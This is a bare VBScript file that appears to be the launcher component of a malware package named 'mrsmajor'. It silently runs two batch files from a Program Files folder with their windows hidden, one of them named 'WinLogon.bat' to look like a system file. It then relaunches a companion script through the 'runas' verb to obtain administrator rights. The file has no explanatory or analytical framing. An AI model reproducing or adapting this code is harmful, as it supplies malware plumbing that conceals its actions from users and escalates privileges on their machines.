set x = createobject("Wscript.shell")
set c = createobject("Scripting.filesystemobject")

dim tmp : tmp=x.expandenvironmentstrings("%TEMP%")
dim dsk : dsk=x.specialfolders("DESKTOP")
dim ke : ke="C:\Program Files\mrsmajor"


x.run """"&ke&"\WinLogon.bat""",0
x.run """"&ke&"\MrsMjrGuiLauncher.bat""",0


 Set ObjShell = CreateObject("Shell.Application") 
 buhu="C:\Program files\mrsmajor\mrsmajorlauncher.vbs" 
 ObjShell.ShellExecute "wscript.exe", """" & buhu & """ RunAsAdministrator", , "runas", 1  




































